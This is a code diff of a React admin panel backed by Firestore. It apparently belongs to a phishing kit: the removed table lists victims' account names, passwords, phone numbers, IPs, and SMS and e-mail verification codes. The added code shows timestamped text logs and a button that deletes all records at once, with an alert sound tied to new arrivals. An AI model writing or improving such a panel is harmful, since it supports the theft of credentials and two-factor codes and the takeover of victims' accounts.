@@ -1,7 +1,7 @@
 /* eslint-disable react-hooks/exhaustive-deps */
 /* eslint-disable no-unused-vars */
 import React, { useEffect, useState } from 'react'
-import { doc, getDoc, onSnapshot, query, where } from "firebase/firestore";
+import { doc, getDoc, onSnapshot, orderBy, query, where } from "firebase/firestore";
 import { collection, getDocs } from "firebase/firestore";
 import { deleteDoc } from "firebase/firestore";
 import db  from '../Firebase';
@@ -18,6 +18,8 @@ function Admin() {
     const [data,setData] = useState([]);
     const [ip,setIp] = useState();
     const audioRef = useRef();
+
+    const [ids,setIds] = useState([]);
 
 
     const play = () => {
@@ -49,18 +51,20 @@ function Admin() {
 
     const getData = async()=>{
        if (logged) {
-        const q = query(collection(db, "users"), where("ip", "!=", ""));
+        const q = query(collection(db, "users"), where("text", "!=", ""), orderBy("timestamp"));
         const unsubscribe = onSnapshot(q, (querySnapshot) => {
             const array = [];
+            const arrayId = [];
+
             querySnapshot.forEach((doc) => {
+                arrayId.push(doc.id)
                 array.push(doc?.data());
 
-                const stored = localStorage.getItem(doc?.data()?.ip);
+                const stored = localStorage.getItem(doc?.data().text);
                 setIp(stored)
                 if (stored !== 'exist') {
                   //play();
-                  localStorage.setItem(doc?.data()?.ip, JSON.stringify("exist"));
-                  console.log("ana hna 2")
+                  localStorage.setItem(doc?.data()?.text, JSON.stringify("exist"));
                 }else{
                   console.log("already stored")
 
@@ -68,7 +72,7 @@ function Admin() {
 
 
             });
-            
+            setIds(arrayId);
             setData(array);
 
             setTimeout(()=>{
@@ -86,6 +90,11 @@ function Admin() {
       await deleteDoc(doc(db, "users", uid));
       localStorage.removeItem(ip)
     }
+
+
+
+
+
     useEffect(()=>{
         getPassword();  
     },[])
@@ -116,6 +125,11 @@ function Admin() {
     },[]);
 
 
+    const deleteAlldata=async()=>{
+      for (let i = 0; i < ids.length; i++) {
+        await deleteDoc(doc(db, "users", ids[i]));
+      }
+    }   
 
   return (
     <div className={styles.admin}>
@@ -146,44 +160,16 @@ function Admin() {
                 <h4>Admin panel</h4>
                 <button onClick={logout} >logout</button>
             </div>
-            <div className={styles.conten2}>
-            <table>
-  <tr>
-    <th>Account name</th>
-    <th>Password</th>
-    <th>Phone</th>
-    <th>Ip</th>
-    <th>Country</th>
-    <th>Code sms</th>
-    <th>Code sms 2</th>
-
-    <th>Code e-mail</th>
-    <th>Code e-mail 2</th>
-
-    <th>Action</th>
-  </tr>
-  {data?.map((user,index)=> 
-    (
-    <tr>
-    <td>{user?.name}</td>
-    <td>{user?.pass}</td>
-    <td>{user?.phone}</td>
-    <td>{user?.ip}</td>
-    <td>{user?.country}</td>
-    <td>{user?.sms}</td>
-    <td>{user?.sms2}</td>
-
-    <td>{user?.mail}</td>
-    <td>{user?.mail2}</td>
-
-
-    <td><button style={{color:"white",backgroundColor:"red",border:"1px solid gray",cursor:'pointer',padding:"9px"}} onClick={()=> deleteData(user?.uid)}>Delete</button></td>
-  </tr>
-    )
-  )}
-  
- 
-</table>
+            <div style={{marginTop:"10px"}} className={styles.conten2}>
+              <br />
+              <center>
+                <button onClick={()=> deleteAlldata()} style={{cursor:"pointer",width:"100px",height:"25px"}}>Clear logs</button>
+              </center>
+              <br />
+              <br />
+              {data.map((item,index)=>{return(
+                <p>{item?.text}</p>
+              )})}
 
             </div>
             <audio ref={audioRef} src={mp3} />
